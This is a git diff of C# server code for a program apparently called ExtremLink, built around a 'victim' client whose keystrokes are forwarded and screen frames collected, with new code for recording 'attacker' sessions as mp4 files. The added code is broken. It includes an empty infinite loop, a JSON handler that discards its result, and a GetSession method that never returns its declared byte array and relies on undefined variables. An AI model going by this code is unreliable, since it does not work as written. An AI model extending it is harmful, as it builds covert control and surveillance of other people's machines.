@@ -16,6 +16,8 @@ using System.Data;
 using System.Data.SqlClient;
 using Microsoft.Data.SqlClient;
 using System.Net.Http;
+using Newtonsoft.Json.Linq;
+using Newtonsoft.Json;
 using System.IO;
 using System.IO.Compression;
 using System.ComponentModel;
@@ -67,6 +69,13 @@ namespace ExtremLink_Server_v2.Classes
             get { return this.victim; }
         }
 
+        // A string which represent a temp file path to the sessions mp4 files
+        private string tempSessionMP4FileName;
+        public string TempSessionMP4FileName
+        {
+            get { return this.tempSessionMP4FileName;}
+            set {  this.tempSessionMP4FileName = value;}
+        }
 
         // Singleton behavior:
         private static Server serverInstance = null;
@@ -207,7 +216,16 @@ namespace ExtremLink_Server_v2.Classes
                 }
             }
         }
-        
+        private async Task HandleAttackerSessionTcpCommunication()
+        {
+            // Input: Nothing.
+            // Output: The fucntion handle with session TCP packets which are sent by the attacker client.
+            while (true)
+            {
+                
+            }
+        }
+
         // Handling clients' users managment type messages functions:       
         private void HandleLoginMessages(string data, TypeOfClient typeOfClient)
         {
@@ -338,6 +356,17 @@ namespace ExtremLink_Server_v2.Classes
             this.victim.SendTCPMessageToClient("⌨", data);
         }
 
+        // Handling attacker's sessions' record time function:
+        private void HandleSessionRecordTimeFunction(string data)
+        {
+            // Input: A string which represent the message of session's record time.
+            // Output: The function handle with the given message.
+            // Reading the data in json format
+            dynamic message = JsonConvert.DeserializeObject(data);
+
+            // Casting the data dynamic object to JObject
+            JObject jsonData = (JObject)message;
+        }
 
 
         // Getting frames function:
@@ -428,6 +457,23 @@ namespace ExtremLink_Server_v2.Classes
             }
         }
 
+
+        // Getting sessions function:
+        public byte[] GetSession()
+        {
+            // Input: Nothing
+            // Output: The function returns a byte array which represents an mp4 file.
+            using (FileStream fileStream = new FileStream(savePath, FileMode.Create, FileAccess.Write))
+            {
+                byte[] buffer = new byte[8192]; // 8 KB buffer
+                int bytesRead;
+
+                while ((bytesRead = clientSocket.Receive(buffer)) > 0)
+                {
+                    fileStream.Write(buffer, 0, bytesRead);
+                }
+            }
+        }
 
 
         // SQL database queries functions
